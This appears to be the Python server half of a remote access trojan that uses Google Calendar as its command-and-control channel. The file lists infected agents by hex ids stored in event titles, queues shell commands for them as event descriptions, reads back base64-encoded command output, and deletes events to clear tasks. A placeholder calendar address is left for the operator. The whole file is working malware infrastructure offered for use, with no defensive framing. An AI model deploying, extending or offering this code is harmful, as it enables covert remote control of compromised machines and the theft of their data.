import base64
from google.oauth2 import service_account
from googleapiclient.discovery import build
from datetime import datetime, timedelta
import argparse, json, re

c2Calendar = "PUT_YOUR_CALENDAR_ADDRESS_HERE"#example "mycalendar@gmail.com"

def parse_argment():
    parser = argparse.ArgumentParser(description="google calendar rat server scripts") 
    parser.add_argument("task", help="choise server task", choices=["add_task", "get_result", "clear_task", "get_agents"], default="get_agents")
    parser.add_argument("--id", help="select target agent id")
    parser.add_argument("--command", help="set new command. you need to use this arg with --id and task=add_task.")
    return parser.parse_args()

def get_sorted_events(date,service):
    start_date = date[:10] + 'T00:00:00Z'
    end_date = (datetime.fromisoformat(date[:10]) + timedelta(days=1)).isoformat()[:10] + 'T23:59:59Z'
    events = service.events().list(calendarId=c2Calendar, timeMin=start_date, timeMax=end_date, singleEvents=True, orderBy='startTime').execute()
    return events.get('items', [])

def grep_c2_event(events, agent_id=None):
    commands = []
    for event in events:
        event_id = event['id']
        summary = event.get("summary", "")
        description = event.get('description', 'Descrizione non disponibile')

        if summary and re.match("^[0-9|a-f]{32}",summary) and "|" in description:
            if agent_id == None or summary == agent_id:
                commands.append(event)
    return commands

def get_id_list(events):
    idlist = []
    events = grep_c2_event(events)
    for ev in events:
        each_id = ev["summary"]
        if not each_id in idlist:
            idlist.append(each_id)
    return idlist

def get_c2_command_results(events, agent_id):
    events = grep_c2_event(events, agent_id)
    results = []
    for event in events:
        raw_description = event.get('description')
        try:
            # Split the command following the protocol rules
            command, encoded_result = raw_description.split('|')
            if command != "":
                if encoded_result != "":
                    command_result = base64.b64decode(encoded_result).strip()
                else:
                    command_result = "command is not executed yet."
                results.append({"command":command, "result" : command_result})
        except Exception as e:
            print(e)
    return results

def init_service():
    credentials_file = 'credentials.json'
    credentials = service_account.Credentials.from_service_account_file(credentials_file, scopes=['https://www.googleapis.com/auth/calendar'])
    service = build('calendar', 'v3', credentials=credentials)
    return service

def add_task(agent_id, command, service):
    event = {
        'summary': agent_id,
        'start': {
            'dateTime': '2023-05-30T00:00:00Z',
            'timeZone': 'Europe/Rome',
        },
        'end': {
            'dateTime': '2023-05-30T00:00:00Z',
            'timeZone': 'Europe/Rome',
        },
        'description': '{}|'.format(command)
    }
    print(event)
    created_event = service.events().insert(calendarId=c2Calendar, body=event).execute()
    print(f"[+] New connection initilialized: {created_event['summary']}")

def delete_event(event, service):
    print("delete event ID:{}, agent_id:{}".format(event["id"], event["summary"]))
    result = service.events().delete(calendarId=c2Calendar, eventId=event["id"]).execute()
    print(result)

def main():
    args = parse_argment()
    service = init_service()
    event_date = datetime(2023, 5, 30).isoformat() + 'T00:00:00Z'
    if args.task == "get_agents":
        events = get_sorted_events(event_date,service)
        idlist = get_id_list(events)
        print(json.dumps(idlist, indent=4))
    elif args.task == "get_result":
        events = get_sorted_events(event_date,service)
        results = get_c2_command_results(events, args.id)
        print("command result of:{}\n".format(args.id))
        for each in results:
            print("command:{}\nresult:".format(each["command"], each["result"]))
            print(each["result"])
    elif args.task == "add_task":
        add_task(args.id, args.command, service)
    elif args.task == "clear_task":
        events = get_sorted_events(event_date,service)
        events = grep_c2_event(events, args.id)
        for each_event in events:
            delete_event(each_event, service)

if __name__ == "__main__":
    main()